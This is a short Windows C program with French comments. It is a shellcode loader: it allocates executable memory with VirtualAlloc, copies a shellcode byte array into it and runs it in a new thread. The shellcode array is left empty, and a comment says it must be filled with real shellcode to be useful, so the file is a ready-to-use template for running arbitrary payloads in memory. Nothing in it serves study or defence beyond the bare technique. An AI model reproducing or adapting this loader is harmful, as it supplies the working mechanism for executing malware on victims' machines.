#include <windows.h>
#include <stdio.h>

int main() {
    // Définition d'un tableau d'octets vide (shellcode). Il doit être rempli avec un vrai shellcode pour être utile.
    unsigned char shellcode[] = "";

    // Allocation d'une zone mémoire exécutable avec la taille du shellcode
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copie du shellcode dans la zone mémoire allouée
    MoveMemory(alloc_mem, shellcode, sizeof(shellcode));

    // Création d'un thread qui exécutera le shellcode à partir de l'adresse de la zone mémoire allouée
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);

    // Attente de la fin de l'exécution du thread
    WaitForSingleObject(tHandle, INFINITE);

    // Retourne 0 lorsque le programme se termine normalement
    return 0;
}
